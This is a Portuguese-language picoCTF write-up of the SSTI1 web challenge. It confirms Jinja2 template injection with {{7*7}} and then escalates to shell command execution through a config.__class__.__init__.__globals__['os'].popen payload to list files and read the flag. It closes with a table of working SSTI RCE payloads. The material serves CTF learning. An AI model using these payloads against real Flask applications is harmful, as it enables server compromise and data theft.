🧠 picoCTF: SSTI1 — Web Exploitation Writeup

📁 Categoria
Web Exploitation

🎯 Objetivo
Descobrir a flag explorando vulnerabilidades na aplicação web.

---

🧩 Etapas do processo de exploração

1. 🕵️ Reconhecimento inicial

- A aplicação web disponibiliza um formulário para o usuário "anunciar" qualquer coisa.
- Ao submeter o formulário, o conteúdo é enviado via método POST para a URL `/`.
- A aplicação então redireciona para a rota `/announce`, exibindo o conteúdo enviado.

🔍 HTML analisado:

<form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
</form>

Observações:
A aplicação permite inserir HTML básico (ex: <h1>olá</h1>), e inicialmente parecia vulnerável a XSS.

Utilizei o webhook.site, considerando que poderia ser uma vulnerabilidade XSS, forçando alguns scripts para exploração via <script>, com a intenção de capturar um possível bot acessando os anúncios e expor um cookie de administrador — mas nenhum bot foi detectado.
Isso descartou XSS como vetor de ataque neste desafio.

2. 📌 Descoberta crucial: indício de SSTI
Ao observar o <title> da página:

html

<title>SSTI1</title>
Ficou evidente que o desafio envolvia SSTI (Server-Side Template Injection).

🧠 O que é SSTI?
Server-Side Template Injection (SSTI) ocorre quando dados do usuário são injetados diretamente em um template do lado do servidor sem sanitização adequada.

SSTI permite que um invasor injete código malicioso em um sistema de template do lado do servidor, fazendo com que o servidor execute esse código.

3. 🧪 Teste de SSTI
✅ Payload usado:

{{7*7}}

💡 Resultado:
A página retornou o valor 49, confirmando que a entrada do usuário estava sendo interpretada como template (provavelmente Jinja2 em Flask).

4. 💣 Execução remota de comandos (RCE) via SSTI
Após confirmação da SSTI, foi tentado executar comandos shell no servidor:

💻 Payload:

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

🚀 Explicando o código passo a passo:
config
→ Variável preexistente no contexto Flask/Jinja2 (flask.config.Config).

.__class__
→ Acessa a classe Config.

.__init__
→ Construtor da classe.

.__globals__
→ Acessa variáveis globais do arquivo Python, incluindo módulos importados como os.

['os']
→ Módulo os.

.popen('ls')
→ Executa o comando ls.

.read()
→ Lê o output do comando.

💣 Resultado prático:

__pycache__  app.py  flag  requirements.txt

Comando shell executado com sucesso. A presença de flag ou flag.txt confirma o alvo!

5. 🏁 Leitura da flag
Com o arquivo identificado, foi utilizado o payload:

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

ou

{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

✅ Resultado:
A flag foi retornada diretamente no corpo da resposta! 🏆

✅ Conclusão
A aplicação estava vulnerável a SSTI.

Foi possível escalar a injeção até execução remota de comandos (RCE).

A flag foi extraída com sucesso utilizando comandos shell via os.popen.

🔐 Referência de Payloads úteis para Jinja2 SSTI

Objetivo	                            Payload
Teste SSTI	                            {{7*7}}
Listar arquivos        	                {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
Ler conteúdo de arquivo	                {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
Executar comandos arbitrários	        Substituir 'cat flag' por qualquer outro comando shell válido
